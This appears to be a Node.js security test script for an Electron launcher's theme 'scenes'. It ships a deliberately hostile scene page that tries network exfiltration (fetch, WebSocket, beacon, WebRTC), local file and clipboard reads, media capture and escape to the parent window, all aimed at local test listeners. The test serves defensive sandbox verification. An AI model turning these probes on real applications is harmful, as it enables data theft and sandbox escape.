// Scenes, attacked. node t8.mjs <exe> <app|-> <userData> <clone> <workDir>
import { spawn } from 'child_process';
import { createRequire } from 'module';
import dgram from 'dgram';
import http from 'http';
import fs from 'fs';
import path from 'path';
const require = createRequire(new URL('../../package.json', import.meta.url));
const yazl = require('yazl');
const [exe, app, ud, clone, work] = process.argv.slice(2);
const sleep = ms => new Promise(r => setTimeout(r, ms));
let port = 25000 + Math.floor(Math.random() * 500);
const res = []; const check = (n, ok, x = '') => { res.push(!!ok); console.log(`${ok ? 'PASS' : 'FAIL'}  ${n}${x !== '' ? '  -> ' + String(x).slice(0, 190) : ''}`); };
fs.rmSync(ud, { recursive: true, force: true }); fs.mkdirSync(ud, { recursive: true });
fs.rmSync(work, { recursive: true, force: true }); fs.mkdirSync(work, { recursive: true });
fs.writeFileSync(path.join(ud, 'settings.json'), JSON.stringify({ sillytavernPath: clone, port: 8123, host: 'localhost', autoStart: false, checkUpdatesOnLaunch: false, checkAppUpdates: false, theme: 'fox', confirmBeforeQuit: false, language: 'en' }));

// listeners a scene must never reach
let httpHits = [], udpHits = 0;
const web = http.createServer((q, r) => { httpHits.push(q.url); r.setHeader('access-control-allow-origin', '*'); r.end('x'); }).listen(0, '127.0.0.1');
const udp = dgram.createSocket('udp4'); udp.on('message', () => udpHits++); await new Promise(r => udp.bind(0, '127.0.0.1', r));
await sleep(100);
const WEB = `http://127.0.0.1:${web.address().port}`, UDP = udp.address().port;
const ATTACK = `<!doctype html><meta charset=utf-8><body style="margin:0;background:transparent"><canvas id=c width=64 height=64></canvas>
<script src="helper.js"></script><link rel=stylesheet href="s.css">
<script>
const W = ${JSON.stringify(WEB)}, U = ${UDP};
const r = {}, tryIt = async (n, f) => { try { const v = await Promise.race([f(), new Promise(res => setTimeout(() => res('PENDING'), 1200))]); r[n] = v === undefined ? 'ran' : String(v).slice(0, 60); } catch (e) { r[n] = 'BLOCKED ' + e.name; } };
addEventListener('message', e => parent.postMessage({ echo: e.data }, '*'));
(async () => {
  r.helper = typeof helperLoaded;
  r.ownBridge = typeof window.desktop;
  await tryIt('parentBridge', () => parent.desktop);
  await tryIt('parentDom', () => parent.document.title);
  await tryIt('topLocation', () => { top.location = W + '/top'; });
  await tryIt('fetchRemote', async () => (await fetch(W + '/fetch')).status);
  await tryIt('fetchNoCors', async () => (await fetch(W + '/fetch2', { mode: 'no-cors' })).type);
  await tryIt('fetchOwn', async () => (await fetch('st-theme://scene-attack/assets/p.png')).status);
  await tryIt('xhr', () => new Promise((a, b) => { const x = new XMLHttpRequest(); x.open('GET', W + '/xhr'); x.onload = () => a(x.status); x.onerror = () => b(new Error('x')); x.send(); }));
  await tryIt('beacon', () => navigator.sendBeacon(W + '/beacon', 'x'));
  await tryIt('websocket', () => new Promise((a, b) => { const s = new WebSocket(W.replace('http', 'ws') + '/ws'); s.onopen = () => a('open'); s.onerror = () => b(new Error('x')); }));
  await tryIt('eventsource', () => new Promise((a, b) => { const s = new EventSource(W + '/es'); s.onopen = () => a('open'); s.onerror = () => b(new Error('x')); }));
  await tryIt('img', () => new Promise((a, b) => { const i = new Image(); i.onload = () => a('loaded'); i.onerror = () => b(new Error('x')); i.src = W + '/img.png'; }));
  await tryIt('script', () => new Promise((a, b) => { const s = document.createElement('script'); s.src = W + '/s.js'; s.onload = () => a('loaded'); s.onerror = () => b(new Error('x')); document.head.append(s); }));
  await tryIt('importRemote', async () => { await import(W + '/m.js'); return 'loaded'; });
  await tryIt('css', () => new Promise((a, b) => { const s = document.createElement('link'); s.rel = 'stylesheet'; s.href = W + '/c.css'; s.onload = () => a('loaded'); s.onerror = () => b(new Error('x')); document.head.append(s); }));
  await tryIt('prefetch', () => { const s = document.createElement('link'); s.rel = 'prefetch'; s.href = W + '/pf'; document.head.append(s); });
  await tryIt('preload', () => { const s = document.createElement('link'); s.rel = 'preload'; s.as = 'image'; s.href = W + '/pl'; document.head.append(s); });
  await tryIt('iframeRemote', () => { const f = document.createElement('iframe'); f.src = W + '/frame'; document.body.append(f); });
  await tryIt('iframeFile', () => { const f = document.createElement('iframe'); f.src = 'file:///C:/Windows/win.ini'; document.body.append(f); });
  await tryIt('open', () => window.open(W + '/popup') ? 'OPENED' : 'blocked');
  await tryIt('download', () => { const a = document.createElement('a'); a.href = 'data:text/plain,x'; a.download = 'x.txt'; document.body.append(a); a.click(); });
  await tryIt('alert', () => alert('x'));
  await tryIt('localStorage', () => localStorage.length);
  await tryIt('sessionStorage', () => sessionStorage.length);
  await tryIt('indexedDB', () => new Promise((a, b) => { const q = indexedDB.open('x'); q.onsuccess = () => a('open'); q.onerror = () => b(new Error('x')); }));
  await tryIt('cookie', () => { document.cookie = 'a=1'; return document.cookie; });
  await tryIt('caches', () => caches.keys());
  await tryIt('serviceWorker', () => navigator.serviceWorker.register('x.js'));
  await tryIt('worker', () => new Promise((a, b) => { const w = new Worker(URL.createObjectURL(new Blob(['postMessage(1)']))); w.onmessage = () => a('ran'); w.onerror = () => b(new Error('x')); }));
  await tryIt('broadcast', () => { new BroadcastChannel('x').postMessage(1); });
  await tryIt('clipboardRead', () => navigator.clipboard.readText());
  await tryIt('clipboardWrite', () => navigator.clipboard.writeText('x'));
  await tryIt('geo', () => new Promise((a, b) => navigator.geolocation.getCurrentPosition(() => a('got'), e => b(new Error('x')), { timeout: 800 })));
  await tryIt('mic', async () => { await navigator.mediaDevices.getUserMedia({ audio: true }); return 'got'; });
  await tryIt('screen', async () => { await navigator.mediaDevices.getDisplayMedia({ video: true }); return 'got'; });
  await tryIt('devices', async () => (await navigator.mediaDevices.enumerateDevices()).length);
  await tryIt('notification', () => Notification.requestPermission());
  r.notificationState = Notification.permission;
  await tryIt('notificationShow', () => new Promise((a, b) => { const n = new Notification('fake'); n.onshow = () => a('SHOWN'); n.onerror = () => b(new Error('x')); }));
  await tryIt('fullscreen', () => document.documentElement.requestFullscreen());
  await tryIt('usb', () => navigator.usb.getDevices());
  await tryIt('fileAccess', () => showOpenFilePicker());
  await tryIt('webrtc', () => new Promise(a => { const p = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:' + U }] }); p.createDataChannel('x'); p.createOffer().then(o => p.setLocalDescription(o)); p.onicecandidate = e => { if (!e.candidate) a('gathered'); }; setTimeout(() => a('timeout'), 1500); }));
  r.canvas = !!document.getElementById('c').getContext('2d');
  r.gl = !!document.createElement('canvas').getContext('webgl2');
  r.origin = String(self.origin);
  parent.postMessage({ report: r }, '*');
  // These replace the page when blocked, so they go last.
  setTimeout(() => { const f = document.createElement('form'); f.action = W + '/form'; document.body.append(f); f.submit(); }, 200);
  setTimeout(() => { const m = document.createElement('meta'); m.httpEquiv = 'refresh'; m.content = '0;url=' + W + '/meta'; document.head.append(m); }, 400);
  setTimeout(() => { try { location.href = W + '/nav'; } catch {} }, 600);
})();
</script>`;
const GOOD = `<!doctype html><meta charset=utf-8><script>addEventListener('message', e => parent.postMessage({ echo: e.data }, '*')); parent.postMessage({ hello: 1 }, '*');</script>`;
const LOOP = `<!doctype html><meta charset=utf-8><script>parent.postMessage({ hello: 'loop' }, '*'); setTimeout(() => { for (;;) {} }, 300);</script>`;
const PNG = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==', 'base64');
const COLORS = { bg: '#101820', panel: '#1b2a38', border: '#33506a', accent: '#39c5bb', text: '#dfeaf2', title: '#ffffff', muted: '#8aa3b5' };
const zip = (file, entries) => new Promise(r => { const z = new yazl.ZipFile(); for (const [n, d] of entries) z.addBuffer(Buffer.isBuffer(d) ? d : Buffer.from(d), n); z.end(); z.outputStream.pipe(fs.createWriteStream(file)).on('close', r); });
const f = n => path.join(work, n + '.sttheme');
const man = (name, extra = {}) => JSON.stringify({ apiVersion: 1, name, author: 'T', colors: COLORS, layers: [{ id: 'sc', src: 'scene/index.html', slot: 'window', ...extra }] });
await zip(f('attack'), [['theme.json', man('Scene Attack')], ['scene/index.html', ATTACK], ['scene/helper.js', 'var helperLoaded = 1;'], ['scene/s.css', 'body{}'], ['assets/p.png', PNG]]);
await zip(f('good'), [['theme.json', man('Scene Good', { when: { page: ['home', 'settings'] } })], ['scene/index.html', GOOD]]);
await zip(f('loop'), [['theme.json', man('Scene Loop')], ['scene/index.html', LOOP]]);
const badZ = {
    'html outside scene/': [['theme.json', man('B')], ['scene/index.html', GOOD], ['a.html', 'x']],
    'js outside scene/': [['theme.json', man('B')], ['scene/index.html', GOOD], ['assets/x.js', 'x']],
    'exe in scene/': [['theme.json', man('B')], ['scene/index.html', GOOD], ['scene/x.exe', 'MZ']],
    'wasm in scene/': [['theme.json', man('B')], ['scene/index.html', GOOD], ['scene/x.wasm', 'x']],
    'two scenes': [['theme.json', JSON.stringify({ apiVersion: 1, name: 'B', colors: COLORS, layers: [{ id: 'a', src: 'scene/index.html' }, { id: 'b', src: 'scene/two.html' }] })], ['scene/index.html', GOOD], ['scene/two.html', GOOD]],
    'scene page missing': [['theme.json', man('B')]],
    'src html outside': [['theme.json', JSON.stringify({ apiVersion: 1, name: 'B', colors: COLORS, layers: [{ src: 'x.html' }] })]],
    'src deep': [['theme.json', JSON.stringify({ apiVersion: 1, name: 'B', colors: COLORS, layers: [{ src: 'scene/../x.html' }] })]],
};
async function ws(url) {
    const s = new WebSocket(url); await new Promise(r => { s.onopen = r; });
    let id = 0; const w = new Map(), events = [];
    s.onmessage = m => { const d = JSON.parse(m.data); if (d.id) w.get(d.id)?.(d); else events.push(d); };
    const send = (method, params = {}, ms = 30000) => new Promise((r, j) => { const i = ++id; w.set(i, r); s.send(JSON.stringify({ id: i, method, params })); setTimeout(() => j(new Error('timeout ' + method + ' ' + String(params.expression).slice(0, 70))), ms); });
    const ev = async (e, ms) => { const r = await send('Runtime.evaluate', { expression: e, awaitPromise: true, returnByValue: true, userGesture: true, replMode: true, includeCommandLineAPI: true }, ms); if (r.result.exceptionDetails) throw new Error(e.slice(0, 80) + ' => ' + JSON.stringify(r.result.exceptionDetails).slice(0, 300)); return r.result.result.value; };
    return { send, ev, events };
}
async function launch(args = []) {
    port += 2; const Q = port;
    spawn(exe, [...(app === '-' ? [] : [app]), `--user-data-dir=${ud}`, `--remote-debugging-port=${Q}`, `--inspect=${Q + 1}`, '--disable-features=CalculateNativeWinOcclusion', ...args], { stdio: 'ignore' });
    let page; for (let i = 0; i < 60 && !page; i++) { await sleep(500); try { page = (await (await fetch(`http://127.0.0.1:${Q}/json/list`)).json()).find(x => x.url.endsWith('launcher.html')); } catch { /* starting */ } }
    await sleep(3500);
    const L = await ws(page.webSocketDebuggerUrl);
    await L.send('Runtime.enable'); await L.send('Log.enable');
    const M = await ws((await (await fetch(`http://127.0.0.1:${Q + 1}/json/list`)).json())[0].webSocketDebuggerUrl);
    await M.ev(`const { BrowserWindow, dialog, app: a0, session, clipboard } = require('electron'); globalThis.W = BrowserWindow.getAllWindows()[0]; globalThis.A = a0; globalThis.__answers = []; globalThis.__boxes = []; dialog.showMessageBox = async (...x) => { __boxes.push(x.at(-1).message); return { response: __answers.length ? __answers.shift() : 0 }; }; globalThis.__perm = []; session.defaultSession.on('will-download', (_e, i) => __perm.push('download ' + i.getURL().slice(0, 40))); W.webContents.on('page-title-updated', () => {}); W.show(); W.moveTop(); 1`);
    await L.ev(`window.__msgs = []; addEventListener('message', e => __msgs.push(e.data)); 1`);
    return { L, M };
}
const quit = async a => { a.M.ev(`setTimeout(() => A.exit(0), 100); 1`).catch(() => {}); await sleep(2500); };
const settings = () => JSON.parse(fs.readFileSync(path.join(ud, 'settings.json'), 'utf8'));
let a = await launch();
const ev = (e, ms) => a.L.ev(e, ms);
for (const [n, e] of Object.entries(badZ)) { await zip(f('bad'), e); const r = await ev(`await D.installTheme(${JSON.stringify(f('bad'))})`); check('refused: ' + n, r?.error, r?.error || JSON.stringify(r)); }
// consent
await a.M.ev(`__answers = [0, 1, 0]; 1`);   // Install: yes, Run scene: no, Keep: yes
let r = await ev(`await D.installTheme(${JSON.stringify(f('attack'))})`); await sleep(900);
check('asked about the scene', (await a.M.ev(`JSON.stringify(__boxes)`)).includes('live scene'), await a.M.ev(`JSON.stringify(__boxes)`));
check('said no: nothing runs', await ev(`(() => { const s = document.querySelector('iframe.layer'); return s && !s.hasAttribute('src') && !__msgs.length; })()`));
await ev(`go('settings'); showSetPane('look'); 1`); await sleep(400);
check('switch shown, off', await ev(`$('themeSceneOn') && !$('themeSceneOn').checked`));
check('sandbox on the frame', await ev(`document.querySelector('iframe.layer').getAttribute('sandbox')`) === 'allow-scripts');
// attack
httpHits = []; udpHits = 0;
await ev(`$('themeSceneOn').click(); 1`);
let rep = null; for (let i = 0; i < 100 && !rep; i++) { await sleep(300); rep = await ev(`(__msgs.find(m => m?.report) || {}).report || null`); }
check('hostile scene ran its tests', !!rep, JSON.stringify(rep)?.slice(0, 150));
await sleep(1500);
console.log('REPORT', JSON.stringify(rep));
check('its own files load', rep?.helper === 'number'); check('canvas works', rep?.canvas === true); console.log('webgl2', rep?.gl, 'origin', rep?.origin);
const notBlocked = Object.entries(rep || {}).filter(([k, v]) => !['helper', 'canvas', 'gl', 'origin', 'ownBridge', 'webrtc'].includes(k) && !String(v).startsWith('BLOCKED'));
console.log('NOT BLOCKED BY EXCEPTION', JSON.stringify(notBlocked));
const left = notBlocked.filter(([, v]) => !['PENDING', 'blocked', 'undefined'].includes(String(v)));
console.log('LOOK AT THESE', JSON.stringify(left));
check('no bridge', rep?.ownBridge === 'undefined' && String(rep?.parentBridge).startsWith('BLOCKED') && String(rep?.parentDom).startsWith('BLOCKED'));
check('no notifications', rep?.notification !== 'granted' && rep?.notificationState !== 'granted' && !String(rep?.notificationShow).includes('SHOWN'), [rep?.notification, rep?.notificationState, rep?.notificationShow].join(' '));
check('no request reached the web server', httpHits.length === 0, httpHits.join(' '));
check('no WebRTC packet left', udpHits === 0, udpHits + ' packets, webrtc=' + rep?.webrtc);
check('app page intact', await ev(`location.href.endsWith('launcher.html') && $('pageTitle').textContent.length > 0`));
check('no download', (await a.M.ev(`__perm.length`)) === 0);
check('no extra window', (await a.M.ev(`BrowserWindow.getAllWindows().length`)) === 1);
check('no box from the scene', !(await a.M.ev(`JSON.stringify(__boxes)`)).includes('"x"'));
const frameUrl = await ev(`document.querySelector('iframe.layer').src`);
check('frame did not leave', frameUrl.startsWith('st-theme://scene-attack/'), frameUrl);
const clicks = await ev(`(() => { const e = document.elementFromPoint(innerWidth / 2, innerHeight / 2); return !e.closest('iframe, .layer-slot'); })()`);
check('scene can\'t catch clicks', clicks);
// a scene that hangs
await a.M.ev(`__answers = [0, 0, 0]; 1`); await ev(`__msgs.length = 0; 1`);
await ev(`await D.installTheme(${JSON.stringify(f('loop'))}); 1`); await sleep(2000);
const t0 = Date.now(); let alive = false;
try { alive = (await ev(`1 + 1`, 8000)) === 2; } catch { /* hung */ }
check('endless loop: launcher stays alive', alive, (Date.now() - t0) + ' ms');
const pids = await a.M.ev(`JSON.stringify(A.getAppMetrics().filter(p => p.cpu.percentCPUUsage > 0 || true).map(p => [p.type, p.serviceName || '', Math.round(p.cpu.percentCPUUsage)]))`);
console.log('PROCESSES', pids);
if (alive) { await sleep(800); const c = await a.M.ev(`JSON.stringify(A.getAppMetrics().map(p => [p.type, Math.round(p.cpu.percentCPUUsage)]))`); console.log('CPU', c); }
await ev(`await D.setTheme('fox'); 1`, 10000).catch(e => console.log('setTheme', e.message)); await sleep(800);
const cpuAfter = await a.M.ev(`A.getAppMetrics(); await new Promise(r => setTimeout(r, 1500)); Math.round(A.getAppMetrics().reduce((n, p) => n + p.cpu.percentCPUUsage, 0))`);
check('leaving the theme ends the loop', cpuAfter < 20, cpuAfter + ' % CPU');
// normal life of a scene
await a.M.ev(`__answers = [0, 0, 0]; 1`); await ev(`__msgs.length = 0; 1`);
await ev(`await D.installTheme(${JSON.stringify(f('good'))}); 1`); await sleep(1200);
const on = () => ev(`document.querySelector('iframe.layer')?.hasAttribute('src')`);
check('allowed scene runs', await on());
const last = () => ev(`([...__msgs].reverse().find(m => m?.echo) || {}).echo || null`);
let st = await last(); check('it hears the app', st?.page === 'settings' || st?.page === 'home', JSON.stringify(st)?.slice(0, 150));
check('hears the accent', st?.accent === '#39c5bb');
await ev(`go('home'); 1`); await sleep(350); st = await last(); check('hears a page change', st?.page === 'home', JSON.stringify(st)?.slice(0, 80));
await ev(`rootState.server = 'running'; 1`); await sleep(250); st = await last(); check('hears the server', st?.server === 'running'); await ev(`rootState.server = 'stopped'; 1`); await sleep(100);
await ev(`go('backups'); 1`); await sleep(350); check('when: not on this page = stopped', !(await on()));
await ev(`__msgs.length = 0; go('home'); 1`); await sleep(700); check('back on the page = started', (await on()) && (await ev(`__msgs.some(m => m?.hello)`)));
await ev(`go('settings'); showSetPane('look'); $('setThemeMotion').value = 'off'; await $('setThemeMotion').onchange(); 1`); await sleep(300);
check('animations off = stopped', !(await on()));
await ev(`$('setThemeMotion').value = 'on'; await $('setThemeMotion').onchange(); 1`); await sleep(500); check('on = started', await on());
await a.M.ev(`W.minimize(); 1`); await sleep(1000); check('minimized: gone', !(await on()));
await a.M.ev(`W.restore(); W.show(); 1`); await sleep(1200); check('restored: back', await on());
await ev(`$('themeSceneOn').click(); 1`); await sleep(500); check('switched off: gone', !(await on()));
await ev(`$('themeSceneOn').click(); 1`); await sleep(500); check('switched on: back', await on());
// changed files need a new yes
const page = path.join(ud, 'themes', 'packages', 'scene-good', 'scene', 'index.html');
await quit(a);
fs.appendFileSync(page, '<!-- changed -->');
a = await launch();
check('changed scene is not run', !(await a.L.ev(`document.querySelector('iframe.layer')?.hasAttribute('src')`)));
await a.L.ev(`go('settings'); showSetPane('look'); 1`); await sleep(300);
check('switch shows off', !(await a.L.ev(`$('themeSceneOn').checked`)));
// the route
const g = u => a.M.ev(`const { session } = require('electron'); const r = await session.defaultSession.fetch(${JSON.stringify(u)}); ({ s: r.status, c: r.headers.get('content-security-policy') })`);
const page2 = await g('st-theme://scene-good/scene/index.html');
check('page comes with the sandbox', page2.s === 200 && page2.c.startsWith('sandbox allow-scripts') && page2.c.includes("connect-src 'none'") && page2.c.includes('st-theme://scene-good'), page2.c);
await quit(a);
web.close(); udp.close();
console.log(`\n${res.filter(Boolean).length}/${res.length} passed`);
process.exit(0);
